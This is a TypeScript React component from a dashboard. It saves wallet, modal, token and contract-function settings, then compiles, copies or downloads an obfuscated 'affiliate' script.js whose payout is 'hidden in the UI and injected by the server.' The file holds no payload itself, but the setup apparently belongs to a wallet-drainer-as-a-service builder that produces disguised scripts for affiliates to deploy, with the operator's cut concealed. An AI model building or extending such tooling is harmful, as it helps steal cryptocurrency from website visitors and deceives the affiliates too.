"use client";

import { useState } from "react";
import { useStore } from "@/lib/store";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Download, Copy, Check, FileCode2, Shield } from "lucide-react";
import { toast } from "sonner";

function downloadFile(filename: string, content: string, type = "text/plain") {
  const blob = new Blob([content], { type });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

export function AffiliateCompileOutput({
  projectId,
  projectName,
}: {
  projectId: string;
  projectName?: string;
}) {
  const { generalConfig, walletConfig, modalConfig, tokensConfig, advancedConfig } = useStore();
  const [compileBusy, setCompileBusy] = useState(false);
  const [compiled, setCompiled] = useState(false);
  const [scriptOutput, setScriptOutput] = useState("");
  const [copied, setCopied] = useState(false);

  async function handleCompile() {
    setCompileBusy(true);
    try {
      const saveRes = await fetch("/api/affiliate/config", {
        method: "PUT",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          projectId,
          general: generalConfig,
          wallet: walletConfig,
          modal: modalConfig,
          tokens: tokensConfig,
          advanced: advancedConfig,
        }),
      });
      const saveData = (await saveRes.json()) as { message?: string };
      if (!saveRes.ok) {
        throw new Error(saveData?.message || "Failed to save affiliate config");
      }

      const compileRes = await fetch("/api/affiliate/compile", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ projectId, obfuscationLevel: "medium" }),
      });

      if (!compileRes.ok) {
        let message = "Failed to compile affiliate script";
        try {
          const compileData = (await compileRes.json()) as { message?: string };
          message = compileData?.message || message;
        } catch {
          // Leave the default message in place.
        }
        throw new Error(message);
      }

      const content = await compileRes.text();
      setScriptOutput(content);
      setCompiled(true);
      toast.success("Affiliate script compiled");
    } catch (error) {
      toast.error(error instanceof Error ? error.message : "Compile failed");
    } finally {
      setCompileBusy(false);
    }
  }

  function handleCopy() {
    navigator.clipboard.writeText(scriptOutput);
    setCopied(true);
    setTimeout(() => setCopied(false), 1800);
    toast.success("Copied script.js");
  }

  function handleDownload() {
    downloadFile(`script-${projectId}.js`, scriptOutput, "application/javascript");
    toast.success("Downloaded script.js");
  }

  return (
    <div className="space-y-6">
      <div className="grid gap-4 md:grid-cols-4">
        <Card className="border-border/40 bg-black/40 backdrop-blur-xl md:col-span-2">
          <CardHeader className="pb-3">
            <CardTitle className="text-sm font-mono uppercase tracking-wider">Affiliate Project</CardTitle>
            <CardDescription>
              Compile a clean affiliate bundle for {projectName || projectId}. Payout stays hidden in the UI and is injected by the server.
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-2 text-sm text-muted-foreground">
            <div className="flex items-center gap-2">
              <Shield className="h-4 w-4 text-primary" />
              <span>Server-controlled payout injection</span>
            </div>
            <div className="flex items-center gap-2">
              <FileCode2 className="h-4 w-4 text-primary" />
              <span>Affiliate compile always uses protected output</span>
            </div>
          </CardContent>
        </Card>
        <Card className="border-border/40 bg-black/40 backdrop-blur-xl">
          <CardContent className="p-4">
            <p className="text-xs text-muted-foreground mb-1">Functions</p>
            <p className="text-xl font-semibold">{tokensConfig.contractFunctions.length}</p>
          </CardContent>
        </Card>
        <Card className="border-border/40 bg-black/40 backdrop-blur-xl">
          <CardContent className="p-4">
            <p className="text-xs text-muted-foreground mb-1">Protection</p>
            <Badge variant="default" className="text-[10px] uppercase tracking-wider">
              Medium+
            </Badge>
          </CardContent>
        </Card>
      </div>

      <Card className="border-border/40 bg-black/40 backdrop-blur-xl">
        <CardHeader className="flex flex-row items-center justify-between gap-4">
          <div>
            <CardTitle className="text-sm font-mono uppercase tracking-wider">Compile Output</CardTitle>
            <CardDescription>Save the current affiliate config, compile the protected script, then copy or download it.</CardDescription>
          </div>
          <Button onClick={() => void handleCompile()} disabled={compileBusy} className="gap-2">
            <FileCode2 className="h-4 w-4" />
            {compileBusy ? "Compiling..." : compiled ? "Recompile script.js" : "Compile script.js"}
          </Button>
        </CardHeader>
        <CardContent className="space-y-4">
          {compiled && scriptOutput ? (
            <>
              <div className="flex flex-wrap gap-2">
                <Button variant="outline" onClick={handleCopy} className="gap-2">
                  {copied ? <Check className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
                  {copied ? "Copied" : "Copy"}
                </Button>
                <Button variant="outline" onClick={handleDownload} className="gap-2">
                  <Download className="h-4 w-4" />
                  Download
                </Button>
              </div>
              <pre className="max-h-[460px] overflow-auto rounded-none border border-border/40 bg-black/70 p-4 text-xs leading-6 text-primary">
                <code>{scriptOutput}</code>
              </pre>
            </>
          ) : (
            <div className="rounded-none border border-dashed border-border/50 bg-black/30 p-8 text-sm text-muted-foreground">
              No compiled script yet. Configure the affiliate panel tabs, then compile here.
            </div>
          )}
        </CardContent>
      </Card>
    </div>
  );
}
